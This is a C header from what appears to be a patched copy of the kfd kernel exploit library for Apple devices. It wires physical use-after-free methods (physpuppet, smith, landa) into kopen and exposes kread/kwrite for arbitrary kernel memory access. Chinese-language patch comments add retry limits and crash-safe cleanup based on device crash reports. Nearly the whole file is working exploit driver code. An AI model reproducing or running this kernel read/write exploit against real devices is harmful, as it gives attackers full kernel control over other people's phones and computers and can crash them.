/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef libkfd_h
#define libkfd_h

/*
 * The global configuration parameters of libkfd.
 *
 * [MF PATCH 04] 改为 #ifndef 守卫：宿主工程可在编译单元用
 *   -DCONFIG_PRINT=0 -DCONFIG_TIMER=0
 * 关掉海量日志，而不必改动 libkfd 本体。未定义时保持与上游一致的默认值。
 */
#ifndef CONFIG_ASSERT
#define CONFIG_ASSERT 1
#endif
#ifndef CONFIG_PRINT
#define CONFIG_PRINT 1
#endif
#ifndef CONFIG_TIMER
#define CONFIG_TIMER 1
#endif

#include "libkfd/common.h"

/*
 * The public API of libkfd.
 */

enum puaf_method {
    puaf_physpuppet,
    puaf_smith,
    puaf_landa,
};

enum kread_method {
    kread_kqueue_workloop_ctl,
    kread_sem_open,
};

enum kwrite_method {
    kwrite_dup,
    kwrite_sem_open,
};

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);
void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size);
void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size);
void kclose(u64 kfd);

/*
 * The private API of libkfd.
 */

struct kfd; // Forward declaration for function pointers.

struct info {
    struct {
        vm_address_t src_uaddr;
        vm_address_t dst_uaddr;
        vm_size_t size;
    } copy;
    struct {
        i32 pid;
        u64 tid;
        u64 vid;
        u64 maxfilesperproc;
    } env;
    struct {
        u64 current_map;
        u64 current_pmap;
        u64 current_proc;
        u64 current_task;
        u64 kernel_map;
        u64 kernel_pmap;
        u64 kernel_proc;
        u64 kernel_task;
    } kaddr;
};

struct perf {
    u64 kernel_slide;
    u64 gVirtBase;
    u64 gPhysBase;
    u64 gPhysSize;
    struct {
        u64 pa;
        u64 va;
    } ttbr[2];
    struct ptov_table_entry {
        u64 pa;
        u64 va;
        u64 len;
    } ptov_table[8];
    struct {
        u64 kaddr;
        u64 paddr;
        u64 uaddr;
        u64 size;
    } shared_page;
    struct {
        i32 fd;
        u32 si_rdev_buffer[2];
        u64 si_rdev_kaddr;
    } dev;
    void (*saved_kread)(struct kfd*, u64, void*, u64);
    void (*saved_kwrite)(struct kfd*, void*, u64, u64);
};

struct puaf {
    u64 number_of_puaf_pages;
    u64* puaf_pages_uaddr;
    void* puaf_method_data;
    u64 puaf_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*run)(struct kfd*);
        void (*cleanup)(struct kfd*);
        void (*free)(struct kfd*);
    } puaf_method_ops;
};

struct krkw {
    u64 krkw_maximum_id;
    u64 krkw_allocated_id;
    u64 krkw_searched_id;
    u64 krkw_object_id;
    u64 krkw_object_uaddr;
    u64 krkw_object_size;
    void* krkw_method_data;
    u64 krkw_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*allocate)(struct kfd*, u64);
        bool (*search)(struct kfd*, u64);
        void (*kread)(struct kfd*, u64, void*, u64);
        void (*kwrite)(struct kfd*, void*, u64, u64);
        void (*find_proc)(struct kfd*);
        void (*deallocate)(struct kfd*, u64);
        void (*free)(struct kfd*);
    } krkw_method_ops;
};

struct kfd {
    struct info info;
    struct perf perf;
    struct puaf puaf;
    struct krkw kread;
    struct krkw kwrite;
};

#include "libkfd/info.h"
#include "libkfd/puaf.h"
#include "libkfd/krkw.h"
#include "libkfd/perf.h"

struct kfd* kfd_init(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, puaf_pages, puaf_method);
    krkw_init(kfd, kread_method, kwrite_method);
    perf_init(kfd);
    return kfd;
}

void kfd_free(struct kfd* kfd)
{
    perf_free(kfd);
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}

/*
 * [MF PATCH 08b] ★ 安全回收 —— 只释放【已经确定初始化成功过】的部分。
 *
 * ── 为什么不能直接用 kfd_free ──
 *
 * kfd_free 是全量释放，前提是【整条初始化链都成功过】：
 *     perf_free → krkw_free → puaf_free → info_free
 *
 * 但 KFD 失败时，链是断的。以 kopen 的执行顺序为例：
 *     1. kfd_init    ✅
 *     2. puaf_run    ✅
 *     3. krkw_run    ❌ ← 最常见的失败点
 *     4. info_run    （没到）
 *     5. perf_run    （没到）
 *
 * 此时对 3/4/5 调 free，等于去释放一个没建好的东西 —— 当场断言或野指针。
 *
 * ★ 真机崩溃报告实锤（FindMy-2026-10-15-204828.ips / 204938.ips）：
 *     krkw_helper_free → kwrite_sem_open_free → kwrite_sem_open_deallocate
 *       → assert 失败 → mf_kfd_fail_hook → kfd_free → SIGSEGV
 *   两次崩溃栈完全一致。根因就是「在半初始化状态上用了全量释放」。
 *
 * ── 这里只做两件确定安全的事 ──
 *
 *   · puaf_free —— puaf_run 在本分支【成功过】，且上游重试路径也这么调
 *   · info_free —— info_init 在 kfd_init 里做过
 *
 * ── fd 泄漏怎么办 ──
 *
 * 不做处理。理由：
 *   · 失败后 gMFKernelPoisoned 会锁死不让重试 → 泄漏不会叠加
 *   · 用户退出 App 时进程结束，所有 fd 由内核自动关闭 → 资源全还回去
 * 这比「冒着崩溃风险去主动关」安全得多。
 */
void mf_kfd_safe_cleanup(struct kfd* kfd)
{
    if (kfd == NULL) return;
    puaf_free(kfd);
    info_free(kfd);
}

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    int fail = -1;
    
    timer_start();

    const u64 puaf_pages_min = 16;
    const u64 puaf_pages_max = 2048;
    assert(puaf_pages >= puaf_pages_min);
    assert(puaf_pages <= puaf_pages_max);
    assert(puaf_method <= puaf_landa);
    assert(kread_method <= kread_sem_open);
    assert(kwrite_method <= kwrite_sem_open);

    struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);

    /*
     * [MF PATCH 08] ★ 把 kfd 指针登记给宿主，供失败钩子回收。
     *
     * 为什么必须这么做（真机紫屏的根源，2026-10-15 实测）：
     *   失败的路径是 mf_kfd_fail_hook() -> longjmp 回 mf_kopen()，
     *   这【绕过了本函数后面所有的清理代码】——
     *     · puaf_run 制造的内核悬空页从没被 puaf_free 释放
     *     · krkw_run 开的 ~10000 个 fd 从没被 krkw_free 关闭
     *   之后用户一重试，内核里就再叠一份。累积几次后物理页分配器
     *   把仍被引用的页发出去 -> use-after-free -> kernel panic。
     *
     *   登记之后，钩子在 longjmp 前会先调 kfd_free() 尽力回收。
     */
    mf_kfd_register_active(kfd);

    // [MF PATCH 07] 上游的 `goto retry` 是【无限循环】：若 landa 在这台机器上恒定
    //   失败（例如 PUAF 页没喷满、或 16GB 机型），kopen 会永不返回，
    //   App 表现为卡死在「启动内核」。这里加次数上限。
    int mf_retry_count = 0;
    const int mf_retry_max = 3;

retry:
    puaf_run(kfd);
    
    fail = krkw_run(kfd);
    if(fail && (puaf_method == puaf_landa)) {
        if (++mf_retry_count >= mf_retry_max) {
            print_failure("landa retry limit reached (%d attempts), giving up", mf_retry_count);
            /* [MF PATCH 08b] 放弃时只做【安全】回收，见 mf_kfd_safe_cleanup 说明 */
            mf_kfd_safe_cleanup(kfd);
            mf_kfd_register_active(NULL);
            mf_kfd_fail_hook("landa retry limit reached", __FILE__, __LINE__);
            return 0;      /* 0 = 失败，mf_kopen 会转成 -1 */
        }
        /*
         * [MF PATCH 09 —— 已回退]
         *
         * 我一度在这里补了 krkw_free(kfd)，理由是「上游漏了，fd 关不掉会泄漏」。
         * 真机崩溃报告证明这是错的（FindMy-2026-10-15-204828.ips / 204938.ips）：
         *
         *     kopen → krkw_helper_free → kwrite_sem_open_free
         *           → kwrite_sem_open_deallocate → assert 失败
         *           → mf_kfd_fail_hook → kfd_free → SIGSEGV
         *
         * 原因：走到这个分支意味着 krkw_run 【失败】了，
         *       kwrite 那半边状态不完整 —— krkw_free 会去 deallocate
         *       一个没建好的东西，当场断言。
         *
         * 上游不 free 它，不是漏了，是知道此时不能 free。
         *
         * fd 泄漏的兜底：失败后 gMFKernelPoisoned 会锁死不让重试，
         * 所以泄漏不会叠加；用户退出 App 时所有 fd 自动关闭，内核资源全还回去。
         */
        puaf_free(kfd);
        info_free(kfd);
        bzero(kfd, sizeof(struct kfd));
        info_init(kfd);
        puaf_init(kfd, puaf_pages, puaf_method);
        krkw_init(kfd, kread_method, kwrite_method);
        perf_init(kfd);
        goto retry;
    }
    
    info_run(kfd);
    perf_run(kfd);
    puaf_cleanup(kfd);

    mf_kfd_register_active(NULL);   /* [MF PATCH 08] 成功路径解登记 */

    timer_end();
    return (u64)(kfd);
}

void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
{
    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
}

void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
{
    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
}

void kclose(u64 kfd)
{
    kfd_free((struct kfd*)(kfd));
}

#endif /* libkfd_h */
